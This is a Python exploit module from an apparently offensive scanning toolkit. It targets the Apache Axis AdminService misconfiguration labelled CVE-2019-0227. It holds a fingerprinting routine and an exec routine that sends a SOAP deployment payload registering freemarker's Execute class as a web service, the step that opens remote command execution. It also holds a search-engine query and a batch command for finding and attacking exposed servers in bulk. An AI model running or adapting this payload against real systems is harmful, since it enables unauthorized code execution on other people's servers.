# coding=utf-8
# @Author   : zpchcbd HG team
# @Blog     : https://www.cnblogs.com/zpchcbd/
# @Time     : 2021-09-10 14:14

from core.data import gLogger
from exploit.scripts import BaseScript
from core.myenums import BugType, BugLevel
from core.request.asynchttp import *
import re

"""
@todo: verify ok
@todo: fofa body="axis2-web/css/axis-style.css"
@todo: python3 batch.py -m exploit.scripts.Axis2.CVE-2019-0227 -fs "body=\"axis2-web/css/axis-style.css\"" -cs
"""



class Script(BaseScript):
    name = 'Axis2'

    def __init__(self, target):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bug_level = BugLevel.HIGH
        # 类型
        self.bug_type = BugType.RCE
        # 编号
        self.bug_number = 'CVE-2019-0227'
        # 来源
        self.bug_refer = ''
        # 特定路径判断
        self.detect_path_list = ['/', '/services', '/axis2/services']
        # exec
        self.exec_path_list = ['/services/AdminService', '/axis2/services/AdminService']
        # 相关信息
        self.info = ''' 漏洞本质是管理员对AdminService的配置错误
        当enableRemoteAdmin属性设置为true时，攻击者可以构造WebService调用freemarker组件中的template.utility.Execute类，
        远程利用AdminService接口进行WebService发布，再次访问生成的WebService接口，传入要执行的命令，就可以进行远程命令执行漏洞的利用。
        SSRF
            1、内网ARP欺骗，https://github.com/RhinoSecurityLabs/CVEs/blob/master/CVE-2019-0227/CVE-2019-0227.py
            2、编辑器漏洞，ueditor的ssrf配合，https://forum.butian.net/share/136
        '''

    async def detect(self):
        try:
            async with aiohttp.ClientSession() as session:
                for detect_path in self.detect_path_list:
                    url = f'http://{self.target}{detect_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{detect_path}'
                    text = await AsyncFetcher.fetch(session=session, url=url, headers=self.headers, timeout=self.req_timeout)
                    if text is not None:
                        m = re.search(r'<a href="(.*?)\?wsdl">', text)
                        if m is not None and m.group(1):
                            self.flag = True
                            gLogger.myscan_info('[{} {}] {}'.format(self.name, BugType.FINGER, url))
                            return {'name': '{} {}'.format(self.name, BugType.FINGER), 'url': url, 'software': self.name}
        except Exception:
            return None

    async def exec(self):
        try:
            async with aiohttp.ClientSession() as session:
                for exec_path in self.exec_path_list:
                    url = f'http://{self.target}{exec_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{exec_path}'
                    headers = {'Content-Type': 'text/xml; charset=utf-8', 'SOAPAction': '""'}
                    data = '''<?xml version="1.0" encoding="UTF-8"?>
                                <soapenv:Envelope
                                xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
                                xmlns:xsd="http://www.w3.org/2001/XMLSchema"
                                xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
                                <soapenv:Body>
                                    <deployment
                                        xmlns="http://xml.apache.org/axis/wsdd/"
                                        xmlns:java="http://xml.apache.org/axis/wsdd/providers/java">
                                        <service name="freemarker" provider="java:RPC">
                                            <parameter name="className" value="freemarker.template.utility.Execute"/>
                                            <parameter name="allowedMethods" value="*"/>
                                        </service>
                                    </deployment>
                                </soapenv:Body>
                                </soapenv:Envelope>'''
                    text = await AsyncFetcher.post_fetch(session=session, url=url, data=data, headers=headers, timeout=self.req_timeout)
                    if text is not None and 'Done processing' in text:
                        gLogger.myscan_info('[{} {}] {}'.format(self.name, self.bug_type, url))
                        return {'name': '{} {}'.format(self.name, self.bug_type), 'url': url, 'software': self.name}
        except Exception:
            return None


if __name__ == '__main__':
    pass
